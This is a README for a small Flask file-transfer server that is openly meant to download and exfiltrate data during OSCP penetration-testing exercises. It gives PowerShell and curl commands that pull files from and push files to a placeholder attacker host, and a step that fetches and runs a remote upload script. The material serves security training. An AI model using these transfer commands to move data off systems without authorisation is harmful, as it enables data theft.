# multi_server

**Warning : This app is designed to help during the OSCP to download/exfiltrate datas. Not to be run in production.**

Tested on : Python 3.11

A simple server in Flask to download/upload files.

	$ git clone https://github.com/adann0/multi_server.git
	$ cd multi_server
	$ python3 -m venv venv
	$ source venv/bin/activate
	$ pip install -r requirements.txt
	$ pip install .

You can then run the Server :

	$ python3 -m multi_server <port>

You can access the webapp at **http://<ip>:<port>**.

You can download the files in the current folder from the command line, for example :

    PS > iwr -uri http://<ip>:<port>/<file> -outfile <file>

You can also upload your files, on Linux :

    $ curl -X POST -F "file=@<file_path>" http://<ip>:<port>/upload

Or with Powershell :

    PS > iwr -uri https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1 -outfile upload.ps1
    PS > .\upload.ps1 -ip <ip> [-port <port>] -file <file_path> 

The uploaded files are in **uploads/**.

## Source

- https://www.geeksforgeeks.org/how-to-upload-file-in-python-flask/
